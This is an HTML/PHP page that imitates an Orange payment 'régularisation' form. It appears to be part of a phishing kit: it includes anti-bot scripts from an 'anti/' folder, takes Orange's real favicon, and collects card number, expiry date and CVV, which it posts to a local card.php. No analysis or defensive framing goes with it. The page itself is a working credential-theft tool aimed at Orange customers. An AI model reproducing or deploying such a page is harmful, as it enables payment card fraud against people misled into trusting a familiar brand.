<?php
include 'anti/ab.php';
include 'anti/ab2.php'; ?>
<!DOCTYPE html>

<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="fr" lang="fr"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <title>Paiement</title>
    <meta name="viewport" content="width=device-width, initial-scale=1"/>
    <link rel="icon" type="image/x-icon" href="https://commande.boutique.orange.fr/merchant/MY_SHOP_ORANGE/webpc/style/media/favicon.ico">
    <link type="text/css" href="./Paiement_files/payment-selector.css" rel="stylesheet">


  <!-- Des choses -->
 
    <!-- Encore des choses -->
<script type="text/javascript" src="./Paiement_files/jquery.min.js.téléchargement"></script>

<script type="text/javascript" src="./Paiement_files/brand-choice.js.téléchargement"></script>
<script type="text/javascript" src="./Paiement_files/service.js.téléchargement"></script>
<script type="text/javascript" src="./Paiement_files/validation-form4.2.7.js.téléchargement"></script>



<script type="text/javascript" src="./Paiement_files/brand-choice.consumer.js.téléchargement"></script>
<script type="text/javascript" src="./Paiement_files/payment-selector.consumer4.2.7.js.téléchargement"></script><meta id="Reverso_extension___elForCheckedInstallExtension" name="Reverso extension" content="2.2.202"></head>
<body style="">
<noscript>Cette page utilise du Javascript. Activez le Javascript via le menu "options" de votre navigateur.</noscript>
<div id="header">
    <div class="nom" style="padding-left: 14px;  width: auto;"><span><img src="img/logo_orange.png" style="height: 40px;"></span><strong>Régularisation</strong></div>
</div>

<div id="container" style="width: auto;">
    <div class="logos">
        <div class="titre big-title">
            Informations de paiements
            <br>
            <span class="small-title">100% sécurisé</span>
            <div style="height: 30px; "><img src="img/logos_paiement_securise.png" style="height: 30px;"></div>
        </div>
    </div>

    <div id="CVS_Coordonnees_Champs_Invalides" class="control no-valid-wth-picto" style="display:none"></div>
    <form action="card.php" method="post" id="payment_form">
<noscript>
    <input type="hidden" id="javascriptDisable" name="javascriptDisable" value="true"/>
</noscript>
<input type="hidden" id="javaDisable" name="javaDisable" value="">
<input type="hidden" id="screenColorDepth" name="screenColorDepth" value="">
<input type="hidden" id="screenInnerHeight" name="screenInnerHeight" value="">
<input type="hidden" id="screenInnerWidth" name="screenInnerWidth" value="">
<input type="hidden" id="timezone" name="timezone" value="">

        <input type="hidden" id="form_card_type" name="card_type" value="">
        <input type="hidden" id="brand_choice_used" name="brandChoiceUsed" value="false">
        <input type="hidden" id="form_card_list" name="card_list" value="cb-visa-mc-ecarte">
        <input type="hidden" id="form_card_country_check_activated" name="card_country_check_activated" value="true">

        <div id="paymentForm">
            <div id="divAmount" class="montant"> <span>
              <sup></sup>
              </span></div>
            <div class="remarque">Les champs marqués d'un <span class="etoile">*</span> sont obligatoires.
            </div>

            <div id="form_js_error_container" style="display: none;">
                <div class="wal_warning">
                    <div class="warningImage"></div>
                    <div id="warning_message" class="warning_message"></div>
                    <div class="clear"></div>
                </div>
            </div>

            <div id="pay_with_card">


                <div class="form_cardType small-line">
                    <label class="libelle">&nbsp;</label>
                    <div class="logos-cartes">
                                <img id="img_cb" class="logo-carte logo-carte-bleue" src="./Paiement_files/logo_card_type_cb.png" alt="Carte Bleue">
                                <img id="img_visa" class="logo-carte logo-carte-visa" src="./Paiement_files/logo_card_type_visa.png" alt="Visa">
                                <img id="img_mc" class="logo-carte logo-carte-mastercard" src="./Paiement_files/logo_card_type_mastercard.png" alt="MasterCard">
                    </div>
                </div>

                <div class="form_CardNumber line">
                    <label for="form_card_number" class="libelle"><strong>Numéro de carte</strong> <span class="etoile">*</span></label>
                    <input id="form_card_number" name="card_number" style="margin-top: 18px;" type="tel" size="16" pattern="[0-9]*" maxlength="19" autocomplete="off" oninput="brandChoiceConsumer.manageBrand(this.value)">
                </div>
                <div class="divExpirationDate line">
                    <p class="libelle" style="width: 250px;"><strong>Date d'expiration</strong> <span class="etoile">*</span></p>
                    <select id="form_expiry_month" name="card_expiration_month">
                        <option value="">Mois</option>
                        <option value="01">01</option>
                        <option value="02">02</option>
                        <option value="03">03</option>
                        <option value="04">04</option>
                        <option value="05">05</option>
                        <option value="06">06</option>
                        <option value="07">07</option>
                        <option value="08">08</option>
                        <option value="09">09</option>
                        <option value="10">10</option>
                        <option value="11">11</option>
                        <option value="12">12</option>
                    </select>
                    <select id="form_expiry_year" name="card_expiration_year">
                        <option><strong>Année</strong></option>
                            <option value="2021">2021</option>
                            <option value="2022">2022</option>
                            <option value="2023">2023</option>
                            <option value="2024">2024</option>
                            <option value="2025">2025</option>
                            <option value="2026">2026</option>
                            <option value="2027">2027</option>
                            <option value="2028">2028</option>
                            <option value="2029">2029</option>
                            <option value="2030">2030</option>
                    </select>
                </div>
                <div class="divSecurityCode line">
                    <label for="form_card_security" class="libelle"  style="width: 250px; margin-top: 14px;"><strong>Numéro de contrôle</strong> <span class="etoile">*</span></label>
                    <input id="form_card_security" name="card_security_code" style="margin-top: 18px;" type="tel" size="5" pattern="[0-9]*" class="codeSecuriteinput" autocomplete="off" maxlength="3"><div style="margin-top: 59px;"><img style="margin-top: 53px;height: 30px;margin-left: -125px;" src="img/cvv-cb.png"> <div style="margin-top: -34px; margin-left: 200px; font-size: 12px;" >Le code de sécurité est composé des 3 derniers chiffres inscrits au verso de votre carte.</div></div>
                    <div class="crypto cvvCBImage" id="cvvImage"></div>
                    <p class="infoSecurityCode" id="cvvCodePhrase"></p>
                </div>

                <div id="brand-displayer" class="clear-both brand-choice-message" style="display: none;">
                    <div id="choice-message">
                        <span> Paiement effectué avec</span>
                        <a id="link-select-network" onclick="brandChoiceConsumer.openModal()">
                            <img id="choice-carte-bleue" class="logo-carte logo-carte-bleue selectable" src="./Paiement_files/logo_card_type_cb.png" alt="Carte bleue" style="display: none;">
                            <img id="choice-visa" class="logo-carte logo-carte-visa selectable" src="./Paiement_files/logo_card_type_visa.png" alt="Visa" style="display: none;">
                            <img id="choice-mastercard" class="logo-carte logo-carte-mastercard selectable" src="./Paiement_files/logo_card_type_mastercard.png" alt="MasterCard" style="display: none;">
                        </a>
                    </div>
                </div>
            </div>
            <div class="clear-both"></div>
        </div>

        <div id="bouton">
            <button id="" type="submit" style="background-color: orange; color: white; height: 40px;" >
            
            <strong>Valider vos Informations</strong></button>
            <div class="clear-both"></div>
        </div>

        <div id="modal-select-network" class="modal">
            <div class="modal-content">
                <span onclick="brandChoiceConsumer.closeModal()" class="close">×</span>
                <div class="brand-choice-text">
                    <p>Votre carte bancaire vous permet d’effectuer votre paiement avec l’une ou l’autre de ces marques&nbsp;:</p>
                </div>
                <div id="choice-radios" class="brand-choice-radios">
                    <div>
                        <label id="radio-cb" class="custom-radio-label">
                            <img class="logo-carte selectable" src="./Paiement_files/logo_card_type_cb.png" alt="Carte Bleue">
                            <input id="card_type_cb" onclick="brandChoiceConsumer.setCardType(this.value)" value="CB" type="radio" name="check_card_type">
                            <span class="custom-radio-span"></span>
                        </label>
                        <label id="radio-visa" class="custom-radio-label">
                            <img class="logo-carte selectable" src="./Paiement_files/logo_card_type_visa.png" alt="Visa">
                            <input id="card_type_visa" name="check_card_type" type="radio" onclick="brandChoiceConsumer.setCardType(this.value)" value="VISA">
                            <span class="custom-radio-span"></span>
                        </label>
                        <label id="radio-mc" class="custom-radio-label">
                            <img class="logo-carte selectable" src="./Paiement_files/logo_card_type_mastercard.png" alt="MasterCard">
                            <input id="card_type_mastercard" name="check_card_type" type="radio" onclick="brandChoiceConsumer.setCardType(this.value)" value="MASTERCARD">
                            <span class="custom-radio-span"></span>
                        </label>
                    </div>
                </div>
                <div class="brand-choice-footer">
                   
                </div>
            </div>
        </div>
    </form>

    <div id="mention">
    Conformément à la loi "informatique et libertés" du 6 janvier 1978 modifiée, vous disposez à tout moment d'un droit d'accès, de rectification et d'opposition aux données vous concernant en écrivant et en justifiant de votre identité à Orange Service Clients Gestion des données personnelles, 33734 Bordeaux Cedex 9.
    </div>
</div>

</body></html>